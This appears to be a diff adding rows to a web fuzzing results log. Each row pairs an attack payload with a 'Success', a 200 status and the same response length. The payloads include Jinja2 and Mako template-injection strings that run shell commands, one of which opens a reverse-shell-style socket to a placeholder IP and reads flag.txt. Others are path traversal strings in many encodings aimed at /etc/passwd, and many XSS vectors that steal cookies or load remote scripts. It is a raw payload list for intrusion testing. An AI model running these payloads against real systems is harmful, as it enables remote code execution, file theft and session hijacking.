+Success,"{{request|attr(""__class__"")}}",200,10701
+Success,{{request.__class__}},200,10701
+Success,{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},200,10701
+Success,"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""ip\"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/cat\"", \""flag.txt\""]);'"").read().zfill(417)}}{%endif%}{% endfor %}",200,10701
+Success,"${self.module.runtime.util.os.system(""id"")}",200,10701
+Success,"${self.template.module.cache.util.os.system(""id"")}",200,10701
+Success,"${self.module.cache.compat.inspect.os.system(""id"")}",200,10701
+Success,${self.__init__.__globals__['util'].os.system('id')},200,10701
+Success,"${self.template.module.runtime.util.os.system(""id"")}",200,10701
+Success,"${self.module.filters.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.module.runtime.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.module.runtime.exceptions.util.os.system(""id"")}",200,10701
+Success,${self.template.__init__.__globals__['os'].system('id')},200,10701
+Success,"${self.module.cache.util.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.module.runtime.util.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.template._mmarker.module.cache.util.os.system(""id"")}",200,10701
+Success,"${self.template.module.cache.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.module.cache.compat.inspect.linecache.os.system(""id"")}",200,10701
+Success,"${self.template._mmarker.module.runtime.util.os.system(""id"")}",200,10701
+Success,"${self.attr._NSAttr__parent.module.cache.util.os.system(""id"")}",200,10701
+Success,"${self.template.module.filters.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.template.module.runtime.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.module.filters.compat.inspect.linecache.os.system(""id"")}",200,10701
+Success,"${self.module.runtime.compat.inspect.linecache.os.system(""id"")}",200,10701
+Success,"${self.template.module.runtime.exceptions.util.os.system(""id"")}",200,10701
+Success,"${self.attr._NSAttr__parent.module.runtime.util.os.system(""id"")}",200,10701
+Success,"${self.context._with_template.module.cache.util.os.system(""id"")}",200,10701
+Success,"${self.module.runtime.exceptions.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.template.module.cache.util.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.context._with_template.module.runtime.util.os.system(""id"")}",200,10701
+Success,"${self.module.cache.util.compat.inspect.linecache.os.system(""id"")}",200,10701
+Success,"${self.template.module.runtime.util.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.module.runtime.util.compat.inspect.linecache.os.system(""id"")}",200,10701
+Success,"${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",200,10701
+Success,"${self.module.runtime.exceptions.util.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.template._mmarker.module.cache.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.template.module.cache.compat.inspect.linecache.os.system(""id"")}",200,10701
+Success,"${self.attr._NSAttr__parent.template.module.cache.util.os.system(""id"")}",200,10701
+Success,"${self.template._mmarker.module.filters.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.template._mmarker.module.runtime.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.template._mmarker.module.runtime.exceptions.util.os.system(""id"")}",200,10701
+Success,"${self.template.module.filters.compat.inspect.linecache.os.system(""id"")}",200,10701
+Success,"${self.template.module.runtime.compat.inspect.linecache.os.system(""id"")}",200,10701
+Success,"${self.attr._NSAttr__parent.template.module.runtime.util.os.system(""id"")}",200,10701
+Success,"${self.context._with_template._mmarker.module.cache.util.os.system(""id"")}",200,10701
+Success,"${self.template.module.runtime.exceptions.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.context._with_template.module.cache.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.module.runtime.exceptions.compat.inspect.linecache.os.system(""id"")}",200,10701
+Success,"${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(""id"")}",200,10701
+Success,"${self.context._with_template._mmarker.module.runtime.util.os.system(""id"")}",200,10701
+Success,"${self.context._with_template.module.filters.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.context._with_template.module.runtime.compat.inspect.os.system(""id"")}",200,10701
+Success,"${self.context._with_template.module.runtime.exceptions.util.os.system(""id"")}",200,10701
+Success,"${self.template.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",200,10701
+Success,{{self._TemplateReference__context.cycler.__init__.__globals__.os}},200,10701
+Success,{{self._TemplateReference__context.joiner.__init__.__globals__.os}},200,10701
+Success,{{self._TemplateReference__context.namespace.__init__.__globals__.os}},200,10701
+Success,{{cycler.__init__.__globals__.os}},200,10701
+Success,{{joiner.__init__.__globals__.os}},200,10701
+Success,{{namespace.__init__.__globals__.os}}../etc/passwd,200,10701
+Success,../../etc/passwd,200,10701
+Success,../../../etc/passwd,200,10701
+Success,../../../../etc/passwd,200,10701
+Success,../../../../../etc/passwd,200,10701
+Success,../../../../../../etc/passwd,200,10701
+Success,../../../../../../../etc/passwd,200,10701
+Success,../../../../../../../../etc/passwd,200,10701
+Success,..%2fetc%2fpasswd,200,10701
+Success,..%2f..%2fetc%2fpasswd,200,10701
+Success,..%2f..%2f..%2fetc%2fpasswd,200,10701
+Success,..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
+Success,..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
+Success,..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
+Success,..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
+Success,..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
+Success,%2e%2e/etc/passwd,200,10701
+Success,%2e%2e/%2e%2e/etc/passwd,200,10701
+Success,%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
+Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
+Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
+Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
+Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
+Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
+Success,%2e%2e%2fetc%2fpasswd,200,10701
+Success,%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
+Success,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
+Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
+Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
+Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
+Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
+Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
+Success,..%252fetc%252fpasswd,200,10701
+Success,..%252f..%252fetc%252fpasswd,200,10701
+Success,..%252f..%252f..%252fetc%252fpasswd,200,10701
+Success,..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
+Success,..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
+Success,..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
+Success,..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
+Success,..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
+Success,%252e%252e/etc/passwd,200,10701
+Success,%252e%252e/%252e%252e/etc/passwd,200,10701
+Success,%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
+Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
+Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
+Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
+Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
+Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
+Success,%252e%252e%252fetc%252fpasswd,200,10701
+Success,%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
+Success,%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
+Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
+Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
+Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
+Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
+Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
+Success,..\etc\passwd,200,10701
+Success,..\..\etc\passwd,200,10701
+Success,..\..\..\etc\passwd,200,10701
+Success,..\..\..\..\etc\passwd,200,10701
+Success,..\..\..\..\..\etc\passwd,200,10701
+Success,..\..\..\..\..\..\etc\passwd,200,10701
+Success,..\..\..\..\..\..\..\etc\passwd,200,10701
+Success,..\..\..\..\..\..\..\..\etc\passwd,200,10701
+Success,..%255cetc%255cpasswd,200,10701
+Success,..%255c..%255cetc%255cpasswd,200,10701
+Success,..%255c..%255c..%255cetc%255cpasswd,200,10701
+Success,..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
+Success,..%255c..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
+Success,..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
+Success,..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
+Success,..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
+Success,..%5c..%5cetc%5cpasswd,200,10701
+Success,..%5c..%5c..%5cetc%5cpasswd,200,10701
+Success,..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
+Success,..%5c..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
+Success,..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
+Success,..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
+Success,..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
+Success,"'';!--""<XSS>=&{()}",200,10701
+Success,"<IMG SRC=# onmouseover=""alert('xxs')"">",200,10701
+Success,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,10701
+Success,&#39;&#88;&#83;&#83;&#39;&#41;>,200,10701
+Success,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,10701
+Success,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,10701
+Success,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,10701
+Success,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",200,10701
+Success,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",200,10701
+Success,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",200,10701
+Success,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",200,10701
+Success,"\"";alert('XSS');//",200,10701
+Success,"<BR SIZE=""&{alert('XSS')}"">",200,10701
+Success,"exp/*<A STYLE='no\xss:noxss(""*//*"");",200,10701
+Success,"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",200,10701
+Success,�script�alert(�XSS�)�/script�,200,10701
+Success,"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",200,10701
+Success,"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",200,10701
+Success,"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",200,10701
+Success,"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",200,10701
+Success,"#""><img src=M onerror=alert('XSS');>",200,10701
+Success,%22;alert%28%27RVRSH3LL_XSS%29//,200,10701
+Success,"alert;pg(""XSS"")",200,10701
+Success,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,10701
+Success,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,10701
+Success,\'-alert(1)//,200,10701
+Success,<%78 onxxx=1 ,200,10701
+Success,<x %6Fnxxx=1 ,200,10701
+Success,<x o%6Exxx=1 ,200,10701
+Success,<x on%78xx=1 ,200,10701
+Success,<x onxxx%3D1,200,10701
+Success,<X onxxx=1 ,200,10701
+Success,<x OnXxx=1 ,200,10701
+Success,<X OnXxx=1 ,200,10701
+Success,<x onxxx=1 onxxx=1,200,10701
+Success,<x/onxxx=1 ,200,10701
+Success,<x%09onxxx=1 ,200,10701
+Success,<x%0Aonxxx=1 ,200,10701
+Success,<x%0Conxxx=1 ,200,10701
+Success,<x%0Donxxx=1 ,200,10701
+Success,<x%2Fonxxx=1 ,200,10701
+Success,<x 1='1'onxxx=1 ,200,10701
+Success,"<x 1=""1""onxxx=1",200,10701
+Success,<x </onxxx=1 ,200,10701
+Success,"<x 1="">"" onxxx=1 ",200,10701
+Success,<http://onxxx%3D1/,200,10701
+Success,<x onxxx=alert(1) 1=',200,10701
+Success,*/alert(1)</script><script>/*,200,10701
+Success,"<script src=""data:&comma;alert(1)//",200,10701
+Success,"<script src=""//brutelogic.com.br&sol;1.js&num; ",200,10701
+Success,"<script/src=""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",200,10701
+Success,<br><br><br><br><br><br><br><br><br><br>,200,10701
+Success,<br><br><br><br><br><br><br><br><br><br>,200,10701
+Success,<br><br><br><br><br><br><x id=x>#x,200,10701
+Success,alert&lpar;1&rpar;,200,10701
+Success,alert&#x28;1&#x29,200,10701
+Success,alert&#40;1&#41,200,10701
+Success,"top[""al""+""ert""](1)",200,10701
+Success,top[/al/.source+/ert/.source](1),200,10701
+Success,navigator.vibrate(500),200,10701
+Success,eval(URL.slice(-8))>#alert(1),200,10701
+Success,eval(location.hash.slice(1)>#alert(1),200,10701
+Success,innerHTML=location.hash>#<script>alert(1)</script>,200,10701
+Success,%3exXx%3c,200,10701
+Success,%253exXx%253c,200,10701
+Success,%25%3exXx%25%3c,200,10701
+Success,%5Cx3exXx%5Cx3c,200,10701
+Success,%26gt%3bxXx%26lt%3b,200,10701
+Success,%26%233e%3bxXx%26%233c%3b,200,10701
+Success,%26%23x3e%3bxXx%26%23x3c%3b,200,10701
+Success,PnhYeDw%3D,200,10701
+Success,%5ce3e7858783c,200,10701
+Success,%5cu003exXx%5cu003c,200,10701
+Success,%5c076xXx%5c074,200,10701
+Success,%C0%BExXx%C0%BC,200,10701
+Success,%5cu563exXx%5cu563c,200,10701
+Success,%C0%BExXx%C0%BC,200,10701
+Success,%22%3exXx%3c%22,200,10701
+Success,%2522%253exXx%253c%2522,200,10701
+Success,%25%22%25%3exXx%25%3c%25%22,200,10701
+Success,%5cx22%5cx3exXx%5cx3c%5cx22,200,10701
+Success,%26quot%3b%26gt%3bxXx%26lt%3b%26quot%3b,200,10701
+Success,%3b%26%2322%3b%26%233e%3bxXx%26%233c%3b%26%2322%3b,200,10701
+Success,%3b%26%23x22%3b%26%23x3e%3bxXx%26%23x3c%3b%26%23x22%3b,200,10701
+Success,Ij54WHg8Ig%3D%3D,200,10701
+Success,%5ce223e7858783c22,200,10701
+Success,%5cu0022xXx%5cu003exXx%5cu003c%5cu0022,200,10701
+Success,%5c042%5c076xXx%5c074%5c042,200,10701
+Success,%C0%A2%C0%BExXx%C0%BC%C0%A2,200,10701
+Success,%5cu5622%5cu563exXx%5cu563c%5cu5622,200,10701
+Success,%C0%A2%C0%BExXx%C0%BC%C0%A2,200,10701
+Success,%27%22%3exXx%3c%27%22,200,10701
+Success,%2527%2522%253exXx%253c%2527%2522,200,10701
+Success,%25%27%25%22%25%3exXx%25%3c%25%27%25%22,200,10701
+Success,%5cx27%5cx22%5cx3exXx%5cx3c%5cx27%5cx22,200,10701
+Success,%26apos%3b%26quot%3b%26gt%3bxXx%26lt%3b%26apos%3b%26quot%3b,200,10701
+Success,%26%2327%3b%26%2322%3b%26%233e%3bxXx%26%233c%3b%26%2327%3b%26%2322%3b,200,10701
+Success,%26%23x27%3b%26%23x22%3b%26%23x3e%3bxXx%26%23x3c%3b%26%23x27%3b%26%23x22%3b,200,10701
+Success,JyI%2beFh4PCci,200,10701
+Success,%5ce27223e7858783c2722,200,10701
+Success,%5cu0027%5cu0022%5cu003exXx%5cu003c%5cu0027%5cu0022,200,10701
+Success,%5c047%5c042%5c076xXx%5c074%5c047%5c042,200,10701
+Success,%C0%A7%C0%A2%C0%BExXx%C0%BC%C0%A7%C0%A2,200,10701
+Success,%5cu5627%5cu5622%5cu563exXx%5cu563c%5cu5627%5cu5622,200,10701
+Success,%C0%A7%C0%A2%C0%BExXx%C0%BC%C0%A7%C0%A2,200,10701
+Success,xXx%27xXx,200,10701
+Success,xXx%2527xXx,200,10701
+Success,xXx%25%27xXx,200,10701
+Success,xXx%5cx27xXx,200,10701
+Success,xXx%26apos%3bxXx,200,10701
+Success,xXx%26%2327%3bxXx,200,10701
+Success,xXx%26%23x27%3bxXx,200,10701
+Success,eFh4InhYeA%3D%3D,200,10701
+Success,%5ce78587827785878,200,10701
+Success,xXx%5cu0027xXx,200,10701
+Success,xXx%5c047xXx,200,10701
+Success,xXx%C0%A7xXx,200,10701
+Success,xXx%5cu5627xXx,200,10701
+Success,xXx%C0%A7xXx,200,10701
+Success,xXx%5c%27xXx,200,10701
+Success,xXx%255c%2527xXx,200,10701
+Success,xXx%25%5c%25%27xXx,200,10701
+Success,xXx%5cx5c%5cx27xXx,200,10701
+Success,xXx%26%2392%3b%26apos%3bxXx,200,10701
+Success,xXx%26%235c%3b%26%2327%3bxXx,200,10701
+Success,xXx%26%23x5c%3b%26%23x27%3bxXx,200,10701
+Success,eFh4XCd4WHg%3D,200,10701
+Success,%5ce7858785c27785878,200,10701
+Success,xXx%5cu005c%5cu0027xXx,200,10701
+Success,xXx%5c134%5c047xXx,200,10701
+Success,xXx%5c%C0%A7xXx,200,10701
+Success,xXx%5cu565c%5cu5627xXx,200,10701
+Success,xXx%5c%C0%A7xXx,200,10701
+Success,xXx%5c%5c%5c%27xXx,200,10701
+Success,xXx%255c%255c%255c%2527xXx,200,10701
+Success,xXx%25%5c%25%5c%25%5c%25%27xXx,200,10701
+Success,xXx%5cx5c%5cx5c%5cx5c%5cx27xXx,200,10701
+Success,xXx%26%2392%3b%26%2392%3b%26%2392%3b%26apos%3bxXx,200,10701
+Success,xXx%26%235c%3b%26%235c%3b%26%235c%3b%26%2327%3bxXx,200,10701
+Success,xXx%26%23x5c%3b%26%23x5c%3b%26%23x5c%3b%26%23x27%3bxXx,200,10701
+Success,eFh4XFxcJ3hYeA%3D%3D,200,10701
+Success,%5ce7858785c5c5c27785878,200,10701
+Success,xXx%5cu005c%5cu005c%5cu005c%5cu0027xXx,200,10701
+Success,xXx%5c134%5c134%5c134%5c047xXx,200,10701
+Success,xXx%5c%5c%5c%C0%A7xXx,200,10701
+Success,xXx%5cu565c%5cu565c%5cu565c%5cu5627xXx,200,10701
+Success,xXx%5c%5c%5c%C0%A7xXx,200,10701
+Success,xXx%22xXx,200,10701
+Success,xXx%2522xXx,200,10701
+Success,xXx%25%22xXx,200,10701
+Success,xXx%5cx22xXx,200,10701
+Success,xXx%26quot%3bxXx,200,10701
+Success,xXx%26%2322%3bxXx,200,10701
+Success,xXx%26%23x22%3bxXx,200,10701
+Success,eFh4InhYeA%3D%3D,200,10701
+Success,%5ce78587822785878,200,10701
+Success,xXx%5cu0022xXx,200,10701
+Success,xXx%5c042xXx,200,10701
+Success,xXx%C0%A2xXx,200,10701
+Success,xXx%5cu5622xXx,200,10701
+Success,xXx%C0%A2xXx,200,10701
+Success,xXx%5c%22xXx,200,10701
+Success,xXx%255c%2522xXx,200,10701
+Success,xXx%25%5c%25%22xXx,200,10701
+Success,xXx%5cx5c%5cx22xXx,200,10701
+Success,xXx%26%2392%3b%26quot%3bxXx,200,10701
+Success,xXx%26%235c%3b%26%2322%3bxXx,200,10701
+Success,xXx%26%23x5c%3b%26%23x22%3bxXx,200,10701
+Success,%5ce7858785c22785878,200,10701
+Success,xXx%5cu005c%5cu0022xXx,200,10701
+Success,xXx%5c134%5c042xXx,200,10701
+Success,xXx%5c%C0%A2xXx,200,10701
+Success,xXx%5cu565c%5cu5622xXx,200,10701
+Success,xXx%5c%C0%A2xXx,200,10701
+Success,xXx%5c%5c%5c%22xXx,200,10701
+Success,xXx%255c%255c%255c%2522xXx,200,10701
+Success,xXx%25%5c%25%5c%25%5c%25%22xXx,200,10701
+Success,xXx%5cx5c%5cx5c%5cx5c%5cx22xXx,200,10701
+Success,xXx%26%2392%3b%26%2392%3b%26%2392%3b%26quot%3bxXx,200,10701
+Success,xXx%26%235c%3b%26%235c%3b%26%235c%3b%26%2322%3bxXx,200,10701
+Success,xXx%26%23x5c%3b%26%23x5c%3b%26%23x5c%3b%26%23x22%3bxXx,200,10701
+Success,eFh4XFxcInhYeA%3D%3D,200,10701
+Success,%5ce7858785c5c5c22785878,200,10701
+Success,xXx%5cu005c%5cu005c%5cu005c%5cu0022xXx,200,10701
+Success,xXx%5c134%5c134%5c134%5c042xXx,200,10701
+Success,xXx%5c%5c%5c%C0%A2xXx,200,10701
+Success,xXx%5cu565c%5cu565c%5cu565c%5cu5622xXx,200,10701
+Success,"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",200,10701
+Success,"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",200,10701
+Success,<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,200,10701
+Success,<%<!--'%><script>alert(1);</script -->,200,10701
+Success,<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?,200,10701
+Success,<svg contentScriptType=text/vbs><script>MsgBox+1,200,10701
+Success,<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,200,10701
+Success,"'';!--""<XSS>=&{()}",200,10701
+Success,SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,200,10701
+Success,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,10701
+Success,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,10701
+Success,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",200,10701
+Success,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",200,10701
+Success,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",200,10701
+Success,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",200,10701
+Success,"\"";alert('XSS');//",200,10701
+Success,"<BR SIZE=""&{alert('XSS')}"">",200,10701
+Success,"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",200,10701
+Success,"exp/*<XSS STYLE='no\xss:noxss(""*//*"");",200,10701
+Success,"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=""javas<![CDATA[cript:alert('XSS');"">",200,10701
+Success,"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->",200,10701
+Success,<? echo('<SCR)';,200,10701
+Success,<A href=javas%26#99;ript:alert(1)>click,200,10701
+Success,"<div id=""39""><!-- up to Opera 11.52, FF 3.6.28 -->",200,10701
+Success,"<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->",200,10701
+Success,"<div id=""43""><?xml version=""1.0"" standalone=""no""?>",200,10701
+Success,"<style type=""text/css"">",200,10701
+Success,"@font-face {font-family: y; src: url(""font.svg#x"") format(""svg"");} body {font: 100px ""y"";}",200,10701
+Success,<body>Hello</body>,200,10701
+Success,"</html>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""53""><xml id=""xss"" src=""test.htc""></xml>",200,10701
+Success,"<div id=""61""><div  style=""\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;"">XXX</div>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""62""><!-- IE 6-8 -->",200,10701
+Success,<!-- IE 6-9 -->,200,10701
+Success,"<div id=""66""><?xml version=""1.0""?>",200,10701
+Success,"<root/>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""67""><!DOCTYPE x [",200,10701
+Success,"    <!ATTLIST img xmlns CDATA ""http://www.w3.org/1999/xhtml"" src CDATA ""xx:x""",200,10701
+Success," onerror CDATA ""alert(67)""",200,10701
+Success," onload CDATA ""alert(2)"">",200,10701
+Success,"]><img />//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""68""><doc xmlns:xlink=""http://www.w3.org/1999/xlink"" xmlns:html=""http://www.w3.org/1999/xhtml"">",200,10701
+Success,"</doc>//[""'`-->]]>]</div>",200,10701
+Success,"<div id=""83""><x:template xmlns:x=""http://www.wapforum.org/2001/wml""  x:ontimer=""$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)""><x:timer value=""1""/></x:template>//[""'`-->]]>]</div>",200,10701
